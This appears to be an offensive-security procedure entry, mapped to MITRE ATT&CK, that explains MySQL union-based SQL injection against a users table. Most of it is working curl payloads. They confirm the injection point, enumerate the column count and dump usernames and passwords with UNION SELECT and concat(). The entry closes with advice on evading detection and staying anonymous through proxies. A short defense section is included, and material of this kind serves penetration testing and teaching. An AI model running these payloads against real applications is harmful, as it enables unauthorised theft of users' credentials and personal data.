---
id: d7c187c3-76dc-419c-8470-bc5d6d9d4df2
name: MySQL-Union-Based-Injection-to-Extract-Users-Table-Data
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:34.330887+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - mysql-injection
  - union-based
  - sql-extraction
  - column-enumeration
  - data-exfiltration
commands:
  - '[[commands/curl-inject-error-based-payload]]'
  - '[[commands/curl-inject-union-payload]]'
platforms:
  - Web
tools: []
validated: true
---

# MySQL-Union-Based-Injection-to-Extract-Users-Table-Data

## Summary

This procedure demonstrates how to perform a MySQL union-based SQL injection attack to extract sensitive data from a Users table in a vulnerable web application. By first enumerating the number of columns through error-based techniques and then crafting a UNION SELECT query, an attacker can retrieve usernames, passwords, emails, or other user information without direct database access.

## Description

Union-based SQL injection exploits vulnerabilities in web applications where user input is not properly sanitized before being incorporated into SQL queries. In a typical scenario, a login or search form parameter (e.g., an ID field) is injectable. The attacker injects payloads that append a malicious UNION SELECT statement to the original query, allowing data from other tables like Users to be returned in the application's response. This technique requires knowledge of the database schema, such as the existence of a Users table with columns like id, username, password, and email. It is commonly used in penetration testing to assess web application security and can lead to full data exfiltration if the application displays query results. Prerequisites include identifying a vulnerable endpoint via tools like sqlmap or manual fuzzing, and assuming MySQL as the backend database.

## Requirements

1. Access to a web application with a vulnerable SQL injection point (e.g., GET or POST parameter in a URL or form).
2. Knowledge of basic SQL syntax and MySQL-specific behaviors, including error messages for column mismatch.
3. Network access to the target application, potentially proxied through tools like Burp Suite for interception and modification.
4. Optional: A wordlist or known table/column names to accelerate enumeration.

## Defense

- Implement strict input validation and sanitization for all user-supplied data, using whitelists for expected formats.
- Use prepared statements or parameterized queries in application code to separate SQL logic from user input.
- Enable database logging and monitor for anomalous queries, such as those containing UNION or subselects from unexpected tables.
- Deploy web application firewalls (WAFs) tuned to detect SQL injection patterns, and regularly audit database schemas for sensitive tables like Users.

## Objectives

1. Enumerate the number of columns in the original query to craft a matching UNION statement.
2. Inject a UNION SELECT payload to append and retrieve data from the Users table.
3. Extract and parse sensitive user information from the application's response.
4. Verify successful exfiltration without triggering application errors or alerts.

## Instructions

### Step 1: Identify the Vulnerable Parameter and Confirm Injection

**Context**: Begin by confirming SQL injection vulnerability in a parameter, such as an ID in a URL like `/user.php?id=1`. Use a simple payload to trigger a database error, indicating unsanitized input.

**Command** ([[commands/curl-inject-error-based-payload]]):
```bash
curl "http://target.com/user.php?id=1'" -v
```

> This sends a single quote to close the string in the query, causing a syntax error if vulnerable. Expected output includes a MySQL error message confirming injection point. If no error, try other parameters or use blind techniques.

### Step 2: Enumerate Column Count Using Error-Based Technique

**Context**: Determine the number of columns in the original SELECT query by injecting a subquery that mismatches columns, forcing an error like "Operand should contain X column(s)". Adjust until the error specifies the correct count (e.g., 3 columns).

**Code Reference**: Use the error-based payload from [[codes/MySQL-Union-Based-Injection-Error-Payload-for-Column-Count]].

**Command** ([[commands/curl-inject-error-based-payload]]):
```bash
curl "http://target.com/user.php?id=1' AND (SELECT * FROM Users) = 1--" -v
```

> Replace 'Users' with a known table if schema is partially enumerated. Expected output: MySQL error revealing column count (e.g., "Operand should contain 3 column(s)"). Increment the subquery (e.g., try a table with more/less columns) until you find the match. This step confirms the query structure without extracting data yet.

### Step 3: Craft and Inject UNION SELECT Payload

**Context**: With the column count known (e.g., 3), inject a UNION SELECT that matches the columns, using NULLs or numbers for non-target positions and column names from Users for extraction. The --+ comments out the rest of the query.

**Code Reference**: Use the union payload from [[codes/MySQL-Union-Based-Injection-Error-Payload-for-Column-Count]].

**Command** ([[commands/curl-inject-union-payload]]):
```bash
curl "http://target.com/user.php?id=-1' UNION SELECT 1,username,password FROM Users--+" -v
```

> Tailor columns to the target (e.g., username,password,email). Expected output: Application response displaying user data in place of normal results, such as a list of usernames and hashed passwords. If columns mismatch, adjust with NULL (e.g., SELECT NULL,username,NULL). For sorting, append ORDER BY, but test incrementally to avoid errors.

### Step 4: Extract and Parse Data

**Context**: Once data appears in responses, systematically query for all records using LIMIT or WHERE clauses if needed. Parse the output manually or with scripts to compile the full Users table dump.

**Command** ([[commands/curl-inject-union-payload]]):
```bash
curl "http://target.com/user.php?id=-1' UNION SELECT 1,concat(username,':',password),3 FROM Users--+" -v
```

> Use concat() to combine fields if the app displays multiple columns separately. Expected output: Concatenated user credentials in the response body. Success is indicated by visible sensitive data without application crashes or empty results.

### Step 5: Verify and Clean Up

**Context**: Confirm extracted data integrity by cross-referencing with known users or hashing formats. Avoid repeated injections to minimize detection; use proxies for anonymity.

> No specific command needed here—review logs or responses. Expected outcome: Complete dataset from Users table, such as 100+ records with valid emails and hashes. If partial, iterate with offsets (e.g., LIMIT 10 OFFSET 10).
